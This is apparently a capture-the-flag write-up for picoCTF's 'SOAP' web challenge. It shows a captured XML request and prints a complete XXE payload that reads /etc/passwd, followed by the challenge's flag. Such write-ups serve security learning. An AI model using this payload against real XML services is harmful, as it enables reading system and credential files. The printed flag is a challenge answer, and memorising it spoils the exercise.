# SOAP

## Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.

Challnege Link: [SOAP](https://play.picoctf.org/practice/challenge/376?category=1&page=2)

## HINTS

(None)

## Approach

Firstly, I see that this site does not have anything interesting, but there are buttons called `Details`.

![Screenshot from 2023-10-22 07-18-24](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/a39c66f8-69c3-47bc-8617-01cfe45e4c0e)

And if we click on it, some information appears, so let's capture it with burp

![Screenshot from 2023-10-22 07-18-33](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/a0b91372-383f-43c2-a6d8-65564c0a976b)
There are `XML` data sent to server then let's try to inject some `XML` code on it to read this file `/etc/passwd`

![Screenshot from 2023-10-22 07-29-26](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/edcafd3e-92a1-4f36-9e16-0078448aa79f)

And we got this file content and our flag with this payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<data><ID>&xxe;</ID></data>
```

![Screenshot from 2023-10-22 07-21-54](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/8f0de241-795c-4429-85e5-e5e5df7d8c40)

# Flag

**picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}**
